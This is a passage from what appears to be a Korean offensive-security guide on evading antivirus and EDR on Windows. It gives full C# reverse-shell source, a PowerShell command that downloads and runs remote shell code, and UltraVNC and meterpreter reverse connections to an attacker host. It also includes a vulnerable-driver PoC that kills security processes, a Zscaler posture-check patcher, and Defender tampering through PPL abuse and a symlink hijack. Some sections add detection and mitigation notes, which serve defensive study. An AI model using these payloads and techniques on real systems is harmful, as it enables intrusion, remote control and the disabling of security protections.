Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW)은 Windows에서 애플리케이션과 시스템 구성요소가 **log events**를 기록할 수 있게 해주는 강력한 로깅 메커니즘입니다. 그러나 보안 제품이 악의적 활동을 모니터링하고 탐지하는 데에도 사용될 수 있습니다.

AMSI가 비활성화(우회)되는 방식과 유사하게, 사용자 공간 프로세스의 **`EtwEventWrite`** 함수를 이벤트를 기록하지 않고 즉시 반환하도록 만들 수도 있습니다. 이는 메모리에서 해당 함수를 패치하여 즉시 반환하도록 함으로써 해당 프로세스의 ETW 로깅을 사실상 비활성화하는 방식입니다.

자세한 정보는 **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**에서 확인할 수 있습니다.


## C# Assembly Reflection

메모리에서 C# 바이너리를 로드하는 것은 오래전부터 알려진 방법이며 AV에 걸리지 않고 post-exploitation 도구를 실행하는 매우 좋은 방법입니다.

페이로드가 디스크를 거치지 않고 직접 메모리에 로드되므로, 프로세스 전체에 대해 AMSI를 패치하는 것만 신경 쓰면 됩니다.

대부분의 C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.)는 이미 C# 어셈블리를 메모리에서 직접 실행할 수 있는 기능을 제공하지만, 이를 수행하는 방법은 여러 가지가 있습니다:

- **Fork\&Run**

새로운 sacrificial process를 **생성(spawn)**하고, 그 새 프로세스에 post-exploitation 악성 코드를 주입(inject)하여 실행한 후 작업이 끝나면 해당 프로세스를 종료하는 방식입니다. 이 방법에는 장점과 단점이 있습니다. Fork and run 방식의 장점은 실행이 우리 Beacon implant 프로세스 **외부**에서 발생한다는 점입니다. 따라서 post-exploitation 동작 중 문제가 생기거나 탐지되더라도 우리 implant가 살아남을 **가능성**이 훨씬 큽니다. 단점은 Behavioural Detections에 의해 발각될 **가능성**이 더 크다는 점입니다.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

자기 자신의 프로세스에 post-exploitation 악성 코드를 **주입**하는 방식입니다. 이렇게 하면 새 프로세스를 생성하고 AV에 의해 스캔되는 것을 피할 수 있지만, 페이로드 실행 중 문제가 발생하면 프로세스가 크래시할 수 있어 Beacon을 **잃을** 가능성이 훨씬 큽니다.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> C# Assembly 로딩에 대해 더 읽고 싶다면 이 글 [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/)와 그들의 InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))를 확인하세요.

PowerShell에서 C# Assemblies를 로드할 수도 있습니다. [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader)와 [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk)를 확인하세요.

## Using Other Programming Languages

As proposed in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), compromised 머신에 Attacker Controlled SMB share에 설치된 인터프리터 환경에 대한 접근을 제공함으로써 다른 언어를 사용해 악성 코드를 실행하는 것이 가능합니다.

SMB share의 Interpreter Binaries와 환경에 대한 접근을 허용하면, 피해 시스템의 메모리 내에서 이러한 언어들로 **임의 코드를 실행**할 수 있습니다.

레포에는 다음과 같이 적혀 있습니다: Defender는 여전히 스크립트를 스캔하지만 Go, Java, PHP 등을 활용하면 **정적 시그니처를 우회할 수 있는 유연성**이 더 커집니다. 이러한 언어들로 작성된 난독화되지 않은 리버스 쉘 스크립트를 테스트한 결과 성공 사례가 보고되었습니다.

## TokenStomping

Token stomping은 공격자가 **액세스 토큰 또는 EDR/AV와 같은 보안 제품의 토큰을 조작**하여 권한을 낮춤으로써 프로세스가 종료되지 않지만 악성 활동을 검사할 권한을 가지지 못하게 만드는 기술입니다.

이를 방지하려면 Windows가 보안 프로세스의 토큰에 대해 외부 프로세스가 핸들을 얻는 것을 **차단**할 필요가 있습니다.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

[**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)에 설명된 대로, 피해자 PC에 Chrome Remote Desktop을 배포한 뒤 이를 통해 원격 제어 및 persistence를 유지하는 것이 쉽습니다:
1. https://remotedesktop.google.com/ 에서 다운로드하고 "Set up via SSH"를 클릭한 다음 Windows용 MSI 파일을 클릭하여 MSI 파일을 다운로드합니다.
2. 피해자에서 설치 프로그램을 무음으로 실행합니다 (관리자 권한 필요): `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop 페이지로 돌아가서 Next를 클릭합니다. 마법사가 권한 부여를 요청하면 Authorize 버튼을 클릭하여 계속합니다.
4. 일부 파라미터를 조정하여 다음 명령을 실행합니다: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (GUI를 사용하지 않고 pin을 설정할 수 있는 pin 파라미터에 주목하세요).


## Advanced Evasion

Evasion은 매우 복잡한 주제입니다. 하나의 시스템에서 다양한 텔레메트리 소스를 고려해야 할 때가 많아, 성숙한 환경에서는 완전히 탐지를 피하는 것이 사실상 불가능한 경우가 많습니다.

각 환경은 고유한 강점과 약점을 가지고 있습니다.

더 고급 Evasion 기법에 대해 감을 잡고 싶다면 [@ATTL4S](https://twitter.com/DaniLJ94)의 이 강연을 꼭 보시길 권합니다.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

또한 [@mariuszbit](https://twitter.com/mariuszbit)의 Evasion in Depth에 관한 훌륭한 강연도 있습니다.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck)를 사용하면 바이너리의 일부를 **제거**하면서 Defender가 어떤 부분을 악성으로 판단하는지 찾아서 분할해 줍니다.\
동일한 기능을 제공하는 또 다른 도구로는 [**avred**](https://github.com/dobin/avred)가 있으며, 웹 서비스를 통해 [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)에서도 제공합니다.

### **Telnet Server**

Windows10 이전에는 모든 Windows에 관리자 권한으로 설치할 수 있는 **Telnet server**가 기본 제공되었습니다:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
시스템 시작 시 **start**되도록 설정하고 지금 **run**하세요:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**telnet 포트 변경** (스텔스) 및 방화벽 비활성화:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

다음에서 다운로드하세요: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (bin 다운로드를 원하며, 설치 프로그램이 아닌 파일을 선택하세요)

**ON THE HOST**: _**winvnc.exe**_를 실행하고 서버를 구성합니다:

- 옵션 _Disable TrayIcon_ 활성화
- _VNC Password_에 비밀번호 설정
- _View-Only Password_에 비밀번호 설정

그런 다음 바이너리 _**winvnc.exe**_와 **새로** 생성된 파일 _**UltraVNC.ini**_를 **victim** 안으로 옮깁니다

#### **Reverse connection**

**attacker**는 자신의 **host**에서 바이너리 `vncviewer.exe -listen 5900`를 실행해야 하며, 이는 reverse **VNC connection**을 수신할 준비를 합니다. 그런 다음 **victim** 안에서: winvnc 데몬을 시작합니다 `winvnc.exe -run` 그리고 `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`를 실행합니다

**WARNING:** 은밀함을 유지하려면 다음 몇 가지를 하지 않아야 합니다

- 이미 실행 중인 경우 `winvnc`를 시작하지 마세요. 그렇지 않으면 [팝업](https://i.imgur.com/1SROTTl.png)이 나타납니다. 실행 여부는 `tasklist | findstr winvnc`로 확인하세요
- 동일한 디렉터리에 `UltraVNC.ini` 없이 `winvnc`를 시작하지 마세요. 그렇지 않으면 [설정 창](https://i.imgur.com/rfMQWcf.png)이 열립니다
- 도움말을 위해 `winvnc -h`를 실행하지 마세요. 그러면 [팝업](https://i.imgur.com/oc18wcu.png)이 발생합니다

### GreatSCT

다음에서 다운로드하세요: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
GreatSCT 내부:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
이제 **start the lister**를 `msfconsole -r file.rc`로 시작하고, **execute**를 사용해 **xml payload**를 실행합니다:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**현재 Defender는 프로세스를 매우 빠르게 종료합니다.**

### 우리만의 reverse shell 컴파일하기

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### 첫 번째 C# Revershell

다음 명령으로 컴파일:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
다음과 함께 사용:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# 컴파일러 사용
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

자동 다운로드 및 실행:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# 난독화 도구 목록: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### python을 사용한 build injectors 예시:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### 기타 도구
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space

Storm-2603는 **Antivirus Terminator**라는 작은 콘솔 유틸리티를 이용해 랜섬웨어를 배포하기 전에 엔드포인트 보호를 비활성화했습니다. 이 도구는 **자체적으로 취약하지만 *서명된* 드라이버**를 포함하고 있으며, 이를 악용해 Protected-Process-Light (PPL) AV 서비스조차 차단할 수 없는 특권 커널 작업을 수행합니다.

주요 요점
1. **서명된 드라이버**: 디스크에 배포되는 파일은 `ServiceMouse.sys`이지만, 실제 바이너리는 Antiy Labs의 “System In-Depth Analysis Toolkit”에 포함된 합법적으로 서명된 드라이버 `AToolsKrnl64.sys`입니다. 드라이버가 유효한 Microsoft 서명을 가지고 있기 때문에 Driver-Signature-Enforcement (DSE)가 활성화되어 있어도 로드됩니다.
2. **서비스 설치**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
첫 번째 명령은 드라이버를 **커널 서비스**로 등록하고 두 번째 명령은 이를 시작하여 `\\.\ServiceMouse`가 사용자 영역에서 접근 가능하도록 만듭니다.
3. **드라이버가 노출하는 IOCTLs**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | PID로 임의의 프로세스를 종료 (Defender/EDR 서비스를 종료하는 데 사용) |
| `0x990000D0` | 디스크의 임의 파일 삭제 |
| `0x990001D0` | 드라이버 언로드 및 서비스 제거 |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **작동 원리**: BYOVD는 사용자 모드 보호를 완전히 우회합니다; 커널에서 실행되는 코드는 *보호된* 프로세스를 열거나 종료하거나 PPL/PP, ELAM 또는 기타 하드닝 기능과 상관없이 커널 객체를 변조할 수 있습니다.

Detection / Mitigation
•  Microsoft의 취약 드라이버 차단 목록(`HVCI`, `Smart App Control`)을 활성화하여 Windows가 `AToolsKrnl64.sys`를 로드하지 못하도록 합니다.  
•  새로운 *커널* 서비스 생성 여부를 모니터링하고 드라이버가 world-writable 디렉터리에서 로드되었거나 허용 목록에 없는 경우 경고를 발생시킵니다.  
•  사용자 모드에서 커스텀 디바이스 객체 핸들이 생성된 후 의심스러운 `DeviceIoControl` 호출이 있는지 감시합니다.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler의 **Client Connector**는 장치 상태 규칙을 로컬에서 적용하고 결과를 다른 구성요소와 통신하기 위해 Windows RPC에 의존합니다. 두 가지 약한 설계 선택으로 인해 완전한 우회가 가능합니다:

1. Posture 평가가 **전적으로 클라이언트 측에서** 이루어지며 (서버에는 부울 값만 전송됩니다).  
2. 내부 RPC 엔드포인트는 연결하는 실행 파일이 **Zscaler에 의해 서명되었는지**(`WinVerifyTrust`를 통해)만 검증합니다.

디스크에 있는 서명된 바이너리 4개를 패치하면 두 메커니즘을 모두 무력화할 수 있습니다:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | 항상 `1`을 반환하여 모든 체크를 통과시킴 |
| `ZSAService.exe` | WinVerifyTrust에 대한 간접 호출 | NOP 처리 ⇒ (심지어 서명되지 않은) 어떤 프로세스도 RPC 파이프에 바인딩 가능 |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret`로 교체 |
| `ZSATunnel.exe` | 터널에 대한 무결성 검사 | 단락 처리(Short-circuited) |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
After replacing the original files and restarting the service stack:

* **All** posture checks display **green/compliant**.
* Unsigned or modified binaries can open the named-pipe RPC endpoints (e.g. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* The compromised host gains unrestricted access to the internal network defined by the Zscaler policies.

This case study demonstrates how purely client-side trust decisions and simple signature checks can be defeated with a few byte patches.

## Protected Process Light (PPL)을 악용하여 AV/EDR을 LOLBINs로 탬퍼링하기

Protected Process Light (PPL)은 서명자/레벨 계층을 강제하여 동등하거나 더 높은 권한의 보호 프로세스만 서로를 변경할 수 있도록 합니다. 공격적으로, 합법적으로 PPL-enabled 바이너리를 실행하고 그 인수를 제어할 수 있다면, benign 기능(예: 로깅)을 AV/EDR에서 사용되는 보호된 디렉터리에 대한 제약된 PPL-backed 쓰기 프리미티브로 전환할 수 있습니다.

프로세스가 PPL로 실행되게 하는 요건
- The target EXE (and any loaded DLLs) must be signed with a PPL-capable EKU.
- The process must be created with CreateProcess using the flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- A compatible protection level must be requested that matches the signer of the binary (e.g., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` for anti-malware signers, `PROTECTION_LEVEL_WINDOWS` for Windows signers). Wrong levels will fail at creation.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN 프리미티브: ClipUp.exe
- 서명된 시스템 바이너리 `C:\Windows\System32\ClipUp.exe`는 자체적으로 프로세스를 생성하며 호출자가 지정한 경로에 로그 파일을 쓰기 위한 인자를 받습니다.
- PPL 프로세스로 실행되면 파일 쓰기는 PPL backing으로 이루어집니다.
- ClipUp는 공백이 포함된 경로를 파싱할 수 없습니다; 일반적으로 보호된 위치를 가리킬 때 8.3 short paths를 사용하세요.

8.3 short path helpers
- List short names: `dir /x` in each parent directory.
- Derive short path in cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) 런처(예: CreateProcessAsPPL)를 사용해 `CREATE_PROTECTED_PROCESS`로 PPL-지원 LOLBIN(ClipUp)을 실행합니다.
2) ClipUp 로그 경로 인자를 전달해 보호된 AV 디렉토리(예: Defender Platform)에 파일 생성을 강제합니다. 필요하면 8.3 short names를 사용하세요.
3) 대상 바이너리가 실행 중 AV에 의해 열려 있거나 잠겨 있다면(예: MsMpEng.exe), AV가 시작하기 전에 부팅 시 쓰기가 실행되도록 더 일찍 실행되는 auto-start service를 설치해 쓰기를 예약하세요. 부팅 순서는 Process Monitor (boot logging)로 검증하세요.
4) 재부팅 시 PPL-backed 쓰기가 AV가 바이너리를 잠그기 전에 발생하여 대상 파일을 손상시키고 시작을 방해합니다.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notes and constraints
- ClipUp가 쓰는 내용은 위치 지정(placement) 외에는 제어할 수 없습니다; 이 프리미티브는 정밀한 콘텐츠 주입보다는 손상(corruption)에 적합합니다.
- 서비스를 설치/시작하고 재부팅 창을 확보하려면 로컬 admin/SYSTEM 권한이 필요합니다.
- 타이밍이 중요합니다: 대상이 열려 있으면 안 됩니다; 부팅 시 실행하면 파일 잠금을 회피할 수 있습니다.

Detections
- 부팅 전후로 비정상적인 인수와 함께 `ClipUp.exe` 프로세스가 생성되는 경우, 특히 비표준 런처가 부모 프로세스인 경우 주의하세요.
- 의심스러운 바이너리를 자동 시작(auto-start)하도록 구성한 신규 서비스가 있고 일관되게 Defender/AV보다 먼저 시작되는 경우. Defender 시작 실패 이전의 서비스 생성/수정 기록을 조사하세요.
- Defender 바이너리 및 Platform 디렉터리에 대한 파일 무결성 모니터링; protected-process 플래그를 가진 프로세스에 의한 예기치 않은 파일 생성/수정.
- ETW/EDR 텔레메트리: `CREATE_PROTECTED_PROCESS`로 생성된 프로세스와 AV가 아닌 바이너리에 의한 비정상적인 PPL 레벨 사용을 확인하세요.

Mitigations
- WDAC/Code Integrity: 어떤 서명된 바이너리가 PPL로 실행될 수 있으며 어떤 부모 아래에서 허용되는지를 제한하세요; 정당한 컨텍스트 외에서의 ClipUp 호출을 차단하세요.
- 서비스 위생: 자동 시작 서비스의 생성/수정 권한을 제한하고 시작 순서 조작을 모니터링하세요.
- Defender tamper protection 및 early-launch 보호가 활성화되어 있는지 확인하세요; 바이너리 손상을 시사하는 시작 오류를 조사하세요.
- 환경과 호환된다면 보안 도구를 호스팅하는 볼륨에서 8.3 단축 이름(short-name) 생성 비활성화를 고려하세요(충분히 테스트하세요).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Microsoft Defender 변조 — Platform Version Folder Symlink Hijack

Windows Defender는 다음 경로의 하위 폴더를 열거하여 실행할 플랫폼을 선택합니다:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

가장 높은 사전식(lexicographic) 버전 문자열(e.g., `4.18.25070.5-0`)을 가진 하위 폴더를 선택한 후 해당 폴더에서 Defender 서비스 프로세스를 시작합니다(서비스/레지스트리 경로도 갱신). 이 선택은 디렉터리 항목(디렉터리 재분기점(reparse points), symlink 포함)을 신뢰합니다. 관리자는 이를 악용해 Defender를 공격자가 쓸 수 있는 경로로 리다이렉트하여 DLL sideloading 또는 서비스 중단을 일으킬 수 있습니다.

Preconditions
- 로컬 Administrator 권한(Platform 폴더 아래에 디렉터리/심링크를 생성하려면 필요)
- 재부팅을 하거나 Defender 플랫폼 재선택을 유발할 수 있는 능력(부팅 시 서비스 재시작)
- 기본 제공 도구만 필요 (mklink)

Why it works
- Defender는 자체 폴더에 대한 쓰기를 차단하지만, 플랫폼 선택은 디렉터리 항목을 신뢰하며 대상이 보호되거나 신뢰된 경로로 해석되는지를 검증하지 않고 사전식으로 가장 높은 버전을 선택합니다.

Step-by-step (example)
1) 현재 플랫폼 폴더의 쓰기 가능한 복사본을 준비합니다(예: `C:\TMP\AV`):
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Platform 내부에 귀하의 folder를 가리키는 higher-version directory symlink를 만드세요:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Trigger 선택 (reboot 권장):
```cmd
shutdown /r /t 0
```
4) 리디렉션된 경로에서 MsMpEng.exe (WinDefend)가 실행되는지 확인:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
새 프로세스 경로가 `C:\TMP\AV\` 아래에 생성되고 서비스 구성/레지스트리가 해당 위치를 반영하는 것을 확인해야 합니다.

사후(포스트 익스플로이테이션) 옵션
- DLL sideloading/code execution: Defender가 애플리케이션 디렉터리에서 로드하는 DLL을 배치하거나 교체하여 Defender의 프로세스에서 코드가 실행되도록 합니다. 위 섹션 참조: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: version-symlink를 제거하여 다음 시작 시 구성된 경로가 해석되지 않아 Defender가 시작에 실패하게 만듭니다:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> 이 기법은 자체적으로 privilege escalation을 제공하지 않으며, 관리자 권한이 필요합니다.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams는 runtime evasion을 C2 implant에서 대상 모듈 자체로 옮겨 Import Address Table (IAT)을 훅킹하고 선택된 APIs를 attacker-controlled position‑independent code (PIC)를 통해 라우팅할 수 있습니다. 이는 많은 kit들이 노출하는 작은 API 표면(예: CreateProcessA)을 넘어 evasion을 일반화하고, 동일한 보호를 BOFs 및 post‑exploitation DLLs에도 확장합니다.

고수준 접근 방법
- reflective loader(앞에 삽입되거나 companion으로)로 대상 모듈 옆에 PIC blob을 스테이징합니다. PIC는 자체적으로 완결되어 있어야 하고 position‑independent여야 합니다.
- host DLL이 로드될 때 IMAGE_IMPORT_DESCRIPTOR를 순회하여 대상 imports(예: CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc)의 IAT 엔트리를 얇은 PIC 래퍼를 가리키도록 패치합니다.
- 각 PIC 래퍼는 real API 주소로 tail‑call하기 전에 evasion을 실행합니다. 일반적인 evasion에는 다음이 포함됩니다:
  - 호출 전후의 메모리 마스크/언마스크(예: beacon 영역 암호화, RWX→RX, 페이지 이름/권한 변경) 후 호출 후 복원.
